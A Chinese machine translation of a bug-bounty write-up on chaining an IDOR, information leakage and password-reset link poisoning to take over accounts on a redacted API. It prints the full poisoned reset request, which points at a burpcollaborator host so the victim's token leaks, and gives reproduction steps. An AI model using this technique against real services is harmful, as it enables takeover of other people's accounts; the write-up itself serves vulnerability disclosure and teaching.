<html>
<head>
<title>Chaining password reset link poisoning, IDOR, and information leakage to achieve account takeover at api.redacted.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">链接密码重置链接中毒，IDOR和信息泄漏，以实现在api.redacted.com的帐户接管</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/chaining-password-reset-link-poisoning-idor-account-information-leakage-to-achieve-account-bb5e0e400745?source=collection_archive---------0-----------------------#2020-11-10">https://infosecwriteups.com/chaining-password-reset-link-poisoning-idor-account-information-leakage-to-achieve-account-bb5e0e400745?source=collection_archive---------0-----------------------#2020-11-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/f3aad3e112e40dc62e6da7024c507021.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LPBlQf9bmE37tPcJ_Nvx2Q.png"/></div></div></figure><p id="3ae2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在评估目标web应用程序的有影响的漏洞时，一个有用的检查可能是查看<a class="ae kw" href="https://archive.org/web/" rel="noopener ugc nofollow" target="_blank"> waybackmachine </a>以发现随着时间的推移已经存在于目标上的URL。这些可能会暴露关键的功能，然后可以对其进行错误测试。我追踪的一个虫子赏金目标碰巧就是这种情况。</p><p id="4742" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">用户可以通过以下端点重置其帐户密码。<code class="fe kx ky kz la b"><strong class="ka ir">https://api.redacted.com/v3/users/resetToken?email=foobar@gmail.com</strong></code></p><p id="b9ef" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在做侦察的时候，我喜欢使用<a class="ae kw" href="https://github.com/tomnomnom/waybackurls" rel="noopener ugc nofollow" target="_blank"> waybackurls </a>自动完成查找URL的过程。搜索该工具的结果发现了密码重置端点的另一个版本，其中包含一个有趣的参数(resetPasswordUrlPrefix)。</p><p id="b0f7" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><code class="fe kx ky kz la b"><strong class="ka ir">https://api.redacted.com/v3/users/resetToken?email=foobar@gmail.com&amp;resetPasswordUrlPrefix=https%3A%2F%web.archive.org%2Fsave%2F_embed%2Fhttps%3A%2F%2Faccounts.redacted.com%2Fmember%2Freset-password</strong></code></p><p id="9b52" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">还值得注意的是，在/v3/users/ endpoint上没有访问控制，允许任何用户通过简单地更改请求中的电子邮件地址或句柄参数来检索属于另一个用户的信息。(这两个参数可以互换)。</p><figure class="lc ld le lf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lb"><img src="../Images/d2e486d0823feaef3a9a978c435a4c35.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lH8jtZ0cW3BEsh9SAWJ88w.png"/></div></div><figcaption class="lg lh gj gh gi li lj bd b be z dk translated">API端点泄漏用户句柄、电子邮件、ID、名字、姓氏</figcaption></figure><p id="823e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">因此，在试图弄清楚resetPasswordUrlPrefix参数的用法时，我想到了一个主意。如果我在重置帐户密码时从burpcollaborator提供了一个有效负载会怎么样？</p><pre class="lc ld le lf gt lk la ll lm aw ln bi"><span id="2960" class="lo lp iq la b gy lq lr l ls lt"><a class="ae kw" href="https://api.redacted.com/v3/users/resetToken?email=foobar@gmail.com&amp;resetPasswordUrlPrefix=https://lvk9gh5vmzmaack1xdb3ekexyo4gs5.burpcollaborator.net/save/_embed/https://accounts.redacted.com/member/reset-password" rel="noopener ugc nofollow" target="_blank"><strong class="la ir">https://api.redacted.com/v3/users/resetToken?email=foobar@gmail.com&amp;resetPasswordUrlPrefix=https://lvk9gh5vmzmaack1xdb3ekexyo4gs5.burpcollaborator.net/save/_embed/https://accounts.redacted.com/member/reset-password</strong></a></span></pre><p id="d3cc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这导致我的burpcollaborator客户端中的一些DNS和HTTP交互，表明密码重置令牌在referer标头中泄漏。这些信息足以证明概念，所以是时候写一份报告了。</p><figure class="lc ld le lf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi lu"><img src="../Images/1df77cb4cf0cda70578417ec39e60492.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*x1ay2pTkPmDwauvMbP8bzQ.png"/></div></div><figcaption class="lg lh gj gh gi li lj bd b be z dk translated">引用标头中泄漏了密码重置令牌</figcaption></figure><p id="8277" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我在下面的步骤中演示了我的概念证明；</p><ol class=""><li id="9c57" class="lv lw iq ka b kb kc kf kg kj lx kn ly kr lz kv ma mb mc md bi translated">为了测试的目的，在程序上注册两个帐户，并登录到一个帐户。</li></ol><p id="537b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">2.向受影响的端点发出请求，将电子邮件地址或句柄替换为属于您的受害者帐户的地址或句柄。</p><pre class="lc ld le lf gt lk la ll lm aw ln bi"><span id="c4de" class="lo lp iq la b gy lq lr l ls lt"><a class="ae kw" href="https://api.redacted.com/v3/users/resetToken?email=foobar@gmail.com&amp;resetPasswordUrlPrefix=https://lvk9gh5vmzmaack1xdb3ekexyo4gs5.burpcollaborator.net/save/_embed/https://accounts.redacted.com/member/reset-password" rel="noopener ugc nofollow" target="_blank"><strong class="la ir">https://api.redacted.com/v3/users/resetToken?email=foobar@gmail.com&amp;resetPasswordUrlPrefix=https://lvk9gh5vmzmaack1xdb3ekexyo4gs5.burpcollaborator.net/save/_embed/https://accounts.redacted.com/member/reset-password</strong></a></span></pre><p id="be4e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">3.受害者帐户将收到一个以攻击者域为前缀的密码重置链接。</p><figure class="lc ld le lf gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi me"><img src="../Images/515988d13415f30bc34245ede681f198.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9ELyuteM8StyVo2r6jinWg.png"/></div></div><figcaption class="lg lh gj gh gi li lj bd b be z dk translated">受害者帐户收到嵌入攻击者控制的域的中毒链接</figcaption></figure><p id="4a8d" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">4.一旦受害者点击中毒链接，攻击者将收到对他/她的域的请求，受害者的密码重置令牌在referer标头中可见。</p><p id="d197" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">5.攻击者在web浏览器中加载密码重置链接，并为受害者帐户设置新密码，从而完成帐户接管。</p><p id="3f13" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这是一个重复的问题。(意思是其他人已经向程序报告了)但是一个特别酷的bug仍然存在。</p><p id="68d3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">如果你喜欢阅读这篇文章，请留下掌声，并确保查看我在寻找bug过程中发现的问题的其他文章。</p><p id="dc08" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">你可以在推特<a class="ae kw" href="https://twitter.com/mase289" rel="noopener ugc nofollow" target="_blank">https://twitter.com/mase289</a>上关注我，我在那里分享bugbounty的相关内容。下次再见，狩猎愉快！</p></div></div>    
</body>
</html>